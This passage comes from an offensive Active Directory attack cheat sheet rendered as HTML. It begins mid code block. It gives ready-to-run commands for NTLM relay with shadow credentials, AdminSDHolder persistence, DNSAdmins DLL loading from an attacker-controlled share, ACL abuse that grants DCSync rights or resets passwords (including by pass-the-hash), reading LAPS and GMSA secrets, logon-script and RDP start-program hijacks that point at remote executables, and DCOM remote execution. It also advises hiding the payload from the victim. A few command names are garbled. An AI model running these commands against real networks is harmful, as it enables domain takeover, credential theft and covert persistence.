</span></span><span style="display:flex;"><span>proxychains python3 ntlmrelayx.py -t ldaps<span style="color:#960050;background-color:#1e0010">:</span>//dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port <span style="color:#ae81ff">81</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute printer bug to trigger authentication from target workstation </span>
</span></span><span style="display:flex;"><span>proxychains python3 printerbug.py ez.lab/matt<span style="color:#960050;background-color:#1e0010">:</span>Password1\!@ws2.ez.lab ws1@8081/file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get a TGT using the newly acquired certificate via PKINIT </span>
</span></span><span style="display:flex;"><span>proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get a ST (service ticket) for the target account </span>
</span></span><span style="display:flex;"><span>proxychains python3 gets4uticket.py kerberos+ccache<span style="color:#960050;background-color:#1e0010">:</span>//ez.lab\\ws2\$<span style="color:#960050;background-color:#1e0010">:</span>ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Utilize the ST for future activity </span>
</span></span><span style="display:flex;"><span>export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
</span></span><span style="display:flex;"><span>proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
</span></span></code></pre></div></li>
</ul>
<h3 id="dangerous-built-in-groups-usage">
  Dangerous Built-in Groups Usage
  <a class="anchor" href="#dangerous-built-in-groups-usage">#</a>
</h3>
<p>If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object <code>CN=AdminSDHolder,CN=System</code> or set <code>&quot;dminCount</code> attribute to <code>0</code> for the required object.</p>
<blockquote>
<p>The AdminCount attribute is set to <code>1</code> automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).</p>
</blockquote>
<p>Find users with <code>AdminCount=1</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec ldap <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password --admin-count
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
</span></span><span style="display:flex;"><span>python ldapdomaindump.py -u example.com\john -p pass123 -d <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#ae81ff">10.10</span>.10.10
</span></span><span style="display:flex;"><span>jq -r <span style="color:#e6db74">&#39;.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]&#39;</span> domain_users.json
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
</span></span><span style="display:flex;"><span>Get-ADUser -LDAPFilter <span style="color:#e6db74">&#34;(objectcategory=person)(samaccountname=*)(admincount=1)&#34;</span>
</span></span><span style="display:flex;"><span>Get-ADGroup -LDAPFilter <span style="color:#e6db74">&#34;(objectcategory=group) (admincount=1)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
</span></span><span style="display:flex;"><span>([<span style="color:#66d9ef">adsisearcher</span>]<span style="color:#e6db74">&#34;(AdminCount=1)&#34;</span>).findall()
</span></span></code></pre></div><h4 id="adminsdholder-abuse">
  AdminSDHolder Abuse
  <a class="anchor" href="#adminsdholder-abuse">#</a>
</h4>
<blockquote>
<p>The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all &ldquo;protected groups&rdquo; in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.</p>
</blockquote>
<p>If you modify the permissions of <strong>AdminSDHolder</strong>, that permission template will be pushed out to all protected accounts automatically by <code>SDProp</code> (in an hour).
E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Add a user to the AdminSDHolder group:</span>
</span></span><span style="display:flex;"><span>Add-DomainObjectAcl -TargetIdentity <span style="color:#e6db74">&#39;CN=AdminSDHolder,CN=System,DC=domain,DC=local&#39;</span> -PrincipalIdentity username -Rights All -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Right to reset password for toto using the account titi</span>
</span></span><span style="display:flex;"><span>Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Give all rights</span>
</span></span><span style="display:flex;"><span>Add-ObjectAcl -TargetADSprefix <span style="color:#e6db74">&#39;CN=AdminSDHolder,CN=System&#39;</span> -PrincipalSamAccountName toto -Verbose -Rights All
</span></span></code></pre></div><h3 id="abusing-dns-admins-group">
  Abusing DNS Admins Group
  <a class="anchor" href="#abusing-dns-admins-group">#</a>
</h3>
<blockquote>
<p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</p>
</blockquote>
<p>:warning: Require privileges to restart the DNS service.</p>
<ul>
<li>Enumerate members of DNSAdmins group
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-NetGroupMember -GroupName <span style="color:#e6db74">&#34;DNSAdmins&#34;</span>
</span></span><span style="display:flex;"><span>Get-ADGroupMember -Identity DNSAdmins
</span></span></code></pre></div></li>
<li>Change dll loaded by the DNS service
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># with RSAT</span>
</span></span><span style="display:flex;"><span>dnscmd &lt;servername&gt; /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
</span></span><span style="display:flex;"><span>dnscmd <span style="color:#ae81ff">10.10</span>.10.11 /config /serverlevelplugindll \\<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>\exploit\privesc.dll
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># with DNSServer module</span>
</span></span><span style="display:flex;"><span>$dnsettings = Get-DnsServerSetting -ComputerName &lt;servername&gt; -Verbose -All
</span></span><span style="display:flex;"><span>$dnsettings.ServerLevelPluginDll = <span style="color:#e6db74">&#34;\attacker_IP\dll\mimilib.dll&#34;</span>
</span></span><span style="display:flex;"><span>Set-DnsServerSetting -InputObject $dnsettings -ComputerName &lt;servername&gt; -Verbose
</span></span></code></pre></div></li>
<li>Check the previous command success
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-ItemProperty HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
</span></span></code></pre></div></li>
<li>Restart DNS
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>sc \\dc01 stop dns
</span></span><span style="display:flex;"><span>sc \\dc01 start dns
</span></span></code></pre></div></li>
</ul>
<h3 id="active-directory-groupsactive-directory-groups">
  <a href="#active-directory-groups">Active Directory Groups</a>
  <a class="anchor" href="#active-directory-groupsactive-directory-groups">#</a>
</h3>
<ul>
<li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
<li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
<li><a href="#abusing-schema-admins-group">Abusing Schema Admins Group</a></li>
<li><a href="#abusing-backup-operators-group">Abusing Backup Operators Group</a></li>
</ul>
<h3 id="abusing-active-directory-aclsaces">
  Abusing Active Directory ACLs/ACEs
  <a class="anchor" href="#abusing-active-directory-aclsaces">#</a>
</h3>
<p>Check ACL for an User with <a href="https://github.com/canix1/ADACLScanner">ADACLScanner</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ADACLScan.ps1 -Base <span style="color:#e6db74">&#34;DC=contoso;DC=com&#34;</span> -Filter <span style="color:#e6db74">&#34;(&amp;(AdminCount=1))&#34;</span> -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
</span></span></code></pre></div><h4 id="genericall">
  GenericAll
  <a class="anchor" href="#genericall">#</a>
</h4>
<ul>
<li>
<p><strong>GenericAll on User</strong> : We can reset user&rsquo;s password without knowing the current password</p>
</li>
<li>
<p><strong>GenericAll on Group</strong> : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group :</p>
<ul>
<li>On Windows : <code>net group &quot;domain admins&quot; hacker /add /domain</code></li>
<li>On Linux:
<ul>
<li>using the Samba software suite :
<code>net rpc group ADDMEM &quot;GROUP NAME&quot; UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]</code></li>
<li>using bloodyAD:
<code>bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>GenericAll/GenericWrite</strong> : We can set a <strong>SPN</strong> on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check for interesting permissions on accounts:</span>
</span></span><span style="display:flex;"><span>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;RDPUsers&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if current user has already an SPN setted:</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Force set the SPN on the account: Targeted Kerberoasting</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=<span style="color:#e6db74">&#39;ops/whatever1&#39;</span>}
</span></span><span style="display:flex;"><span>PowerView3 &gt; Set-DomainObject -Identity &lt;UserName&gt; -Set @{serviceprincipalname=<span style="color:#e6db74">&#39;any/thing&#39;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Grab the ticket</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; $User = Get-DomainUser username 
</span></span><span style="display:flex;"><span>PowerView2 &gt; $User | Get-DomainSPNTicket | fl
</span></span><span style="display:flex;"><span>PowerView2 &gt; $User | Select serviceprincipalname
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove the SPN</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; Set-DomainObject -Identity username -Clear serviceprincipalname
</span></span></code></pre></div></li>
<li>
<p><strong>GenericAll/GenericWrite</strong> : We can change a victim&rsquo;s <strong>userAccountControl</strong> to not require Kerberos preauthentication, grab the user&rsquo;s crackable AS-REP, and then change the setting back.</p>
<ul>
<li>On Windows:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Modify the userAccountControl</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue
</span></span><span style="display:flex;"><span>PowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=<span style="color:#ae81ff">4194304</span>} -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Grab the ticket</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue
</span></span><span style="display:flex;"><span>ASREPRoast &gt; Get-ASREPHash -Domain domain.local -UserName username
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set back the userAccountControl</span>
</span></span><span style="display:flex;"><span>PowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=<span style="color:#ae81ff">4194304</span>} -Verbose
</span></span><span style="display:flex;"><span>PowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue
</span></span></code></pre></div><ul>
<li>On Linux:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Modify the userAccountControl</span>
</span></span><span style="display:flex;"><span>$ bloodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Grab the ticket</span>
</span></span><span style="display:flex;"><span>$ GetNPUsers.py DOMAIN/target_user -format &lt;AS_REP_responses_format <span style="color:#f92672">[</span>hashcat | john<span style="color:#f92672">]</span>&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set back the userAccountControl</span>
</span></span><span style="display:flex;"><span>$ bloodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false
</span></span></code></pre></div></li>
</ul>
<h4 id="genericwrite">
  GenericWrite
  <a class="anchor" href="#genericwrite">#</a>
</h4>
<ul>
<li>
<p>Reset another user&rsquo;s password</p>
<ul>
<li>On Windows:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1</span>
</span></span><span style="display:flex;"><span>$user = <span style="color:#e6db74">&#39;DOMAIN\user1&#39;</span>; 
</span></span><span style="display:flex;"><span>$pass= ConvertTo-SecureString <span style="color:#e6db74">&#39;user1pwd&#39;</span> -AsPlainText -Force; 
</span></span><span style="display:flex;"><span>$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
</span></span><span style="display:flex;"><span>$newpass = ConvertTo-SecureString <span style="color:#e6db74">&#39;newsecretpass&#39;</span> -AsPlainText -Force; 
</span></span><span style="display:flex;"><span>Set-DomainUserPassword -Identity <span style="color:#e6db74">&#39;DOMAIN\user2&#39;</span> -AccountPassword $newpass -Credential $creds;
</span></span></code></pre></div></li>
<li>On Linux:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Using rpcclient from the  Samba software suite</span>
</span></span><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;attacker_user%my_password&#39;</span> -W DOMAIN -c <span style="color:#e6db74">&#34;setuserinfo2 target_user 23 target_newpwd&#34;</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using bloodyAD with pass-the-hash</span>
</span></span><span style="display:flex;"><span>bloodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
</span></span></code></pre></div></li>
</ul>
</li>
<li>
<p>WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : <code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue &quot;\\10.0.0.5\totallyLegitScript.ps1</code></p>
</li>
</ul>
<h5 id="genericwrite-and-remote-connection-manager">
  GenericWrite and Remote Connection Manager
  <a class="anchor" href="#genericwrite-and-remote-connection-manager">#</a>
</h5>
<blockquote>
<p>Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.</p>
<p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - <a href="https://sensepost.com/blog/2020/ace-to-rce/">https://sensepost.com/blog/2020/ace-to-rce/</a></p>
</blockquote>
<p>:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$UserObject = ([<span style="color:#66d9ef">ADSI</span>](<span style="color:#e6db74">&#34;LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld&#34;</span>))
</span></span><span style="display:flex;"><span>$UserObject.TerminalServicesInitialProgram = <span style="color:#e6db74">&#34;\\1.2.3.4\share\file.exe&#34;</span>
</span></span><span style="display:flex;"><span>$UserObject.TerminalServicesWorkDirectory = <span style="color:#e6db74">&#34;C:\&#34;</span>
</span></span><span style="display:flex;"><span>$UserObject.SetInfo()
</span></span></code></pre></div><p>NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.</p>
<h4 id="writedacl">
  WriteDACL
  <a class="anchor" href="#writedacl">#</a>
</h4>
<p>To abuse <code>WriteDacl</code> to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. <a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : <code>./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'</code></p>
<ul>
<li>
<p>WriteDACL on Domain:</p>
<ul>
<li>On Windows:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Give DCSync right to the principal identity</span>
</span></span><span style="display:flex;"><span>Import-Module .\PowerView.ps1
</span></span><span style="display:flex;"><span>$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;user1pwd&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;DOMAIN.LOCAL\user1&#39;</span>, $SecPassword)
</span></span><span style="display:flex;"><span>Add-DomainObjectAcl -Credential $Cred -TargetIdentity <span style="color:#e6db74">&#39;DC=domain,DC=local&#39;</span> -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
</span></span></code></pre></div></li>
</ul>
<p>* On Linux:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Give DCSync right to the principal identity
</span></span><span style="display:flex;"><span>oodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Remove right after DCSync
</span></span><span style="display:flex;"><span>oodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False
</span></span></code></pre></div></li>
<li>
<p>WriteDACL on Group</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Add-DomainObjectAcl -TargetIdentity <span style="color:#e6db74">&#34;INTERESTING_GROUP&#34;</span> -Rights WriteMembers -PrincipalIdentity User1
</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;INTERESTING_GROUP&#34;</span> User1 /add /domain
</span></span></code></pre></div><p>Or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove right</span>
</span></span><span style="display:flex;"><span>bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
</span></span></code></pre></div></li>
</ul>
<h4 id="writeowner">
  WriteOwner
  <a class="anchor" href="#writeowner">#</a>
</h4>
<p>An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-DomainObjectOwner -Identity <span style="color:#e6db74">&#39;target_object&#39;</span> -OwnerIdentity <span style="color:#e6db74">&#39;controlled_principal&#39;</span>
</span></span></code></pre></div><p>Or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object
</span></span></code></pre></div><p>This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.</p>
<h4 id="readlapspassword">
  ReadLAPSPassword
  <a class="anchor" href="#readlapspassword">#</a>
</h4>
<p>An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the <a href="#reading-laps-password">Reading LAPS Password</a> section.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADComputer -filter {ms-mcs-admpwdexpirationtime <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#39;*&#39;</span>} -prop <span style="color:#e6db74">&#39;ms-mcs-admpwd&#39;</span>,<span style="color:#e6db74">&#39;ms-mcs-admpwdexpirationtime&#39;</span>
</span></span></code></pre></div><p>Or for a given computer</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>bloodyAD.py -u john.doe -d bloody -p Password512 --host <span style="color:#ae81ff">192.168</span>.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
</span></span></code></pre></div><h4 id="readgmsapassword">
  ReadGMSAPassword
  <a class="anchor" href="#readgmsapassword">#</a>
</h4>
<p>An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Save the blob to a variable</span>
</span></span><span style="display:flex;"><span>$gmsa = Get-ADServiceAccount -Identity <span style="color:#e6db74">&#39;SQL_HQ_Primary&#39;</span> -Properties <span style="color:#e6db74">&#39;msDS-ManagedPassword&#39;</span>
</span></span><span style="display:flex;"><span>$mp = $gmsa.<span style="color:#e6db74">&#39;msDS-ManagedPassword&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decode the data structure using the DSInternals module</span>
</span></span><span style="display:flex;"><span>ConvertFrom-ADManagedPasswordBlob $mp
</span></span></code></pre></div><p>Or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python bloodyAD.py -u john.doe -d bloody -p Password512 --host <span style="color:#ae81ff">192.168</span>.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
</span></span></code></pre></div><h4 id="forcechangepassword">
  ForceChangePassword
  <a class="anchor" href="#forcechangepassword">#</a>
</h4>
<p>An attacker can change the password of the user this ACE applies to:</p>
<ul>
<li>On Windows, this can be achieved with <code>Set-DomainUserPassword</code> (PowerView module):</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$NewPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;Password123!&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>Set-DomainUserPassword -Identity <span style="color:#e6db74">&#39;TargetUser&#39;</span> -AccountPassword $NewPassword
</span></span></code></pre></div><ul>
<li>On Linux:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Using rpcclient from the  Samba software suite</span>
</span></span><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;attacker_user%my_password&#39;</span> -W DOMAIN -c <span style="color:#e6db74">&#34;setuserinfo2 target_user 23 target_newpwd&#34;</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using bloodyAD with pass-the-hash</span>
</span></span><span style="display:flex;"><span>bloodyAD.py --host <span style="color:#f92672">[</span>DC IP<span style="color:#f92672">]</span> -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
</span></span></code></pre></div><h3 id="dcom-exploitation">
  DCOM Exploitation
  <a class="anchor" href="#dcom-exploitation">#</a>
</h3>
<blockquote>
<p>DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.</p>
</blockquote>
<ul>
<li>Impacket DCOMExec.py
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH<span style="color:#960050;background-color:#1e0010">:</span>NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [<span style="color:#66d9ef">command ...</span>]
</span></span><span style="display:flex;"><span>dcomexec.py -share C$ -object MMC20 <span style="color:#e6db74">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;&#39;</span>
</span></span><span style="display:flex;"><span>dcomexec.py -share C$ -object MMC20 <span style="color:#e6db74">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;&#39;</span> <span style="color:#e6db74">&#39;ipconfig&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER<span style="color:#960050;background-color:#1e0010">:</span>$PASSWORD\$@$HOST <span style="color:#e6db74">&#39;notepad.exe&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -object MMC20 specifies that we wish to instantiate the MMC20.Application object.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -silentcommand executes the command without attempting to retrieve the output.</span>
</span></span></code></pre></div></li>
